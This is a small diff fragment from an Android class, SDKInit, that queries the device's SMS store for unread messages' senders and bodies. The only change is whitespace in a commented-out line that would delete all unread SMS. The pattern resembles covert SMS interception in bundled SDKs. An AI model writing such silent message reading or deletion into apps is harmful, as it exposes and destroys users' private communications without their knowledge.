@@ -184,6 +184,6 @@ public class SDKInit {
         SDKInit.mContext.getContentResolver().query(Uri.parse("content://sms"),
                 new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
                 "date desc");
-//        SDKInit.getResolver().delete(Uri.parse("content://sms"), "read=0", null);
+//       SDKInit.getResolver().delete(Uri.parse("content://sms"), "read=0", null);
     }
 }
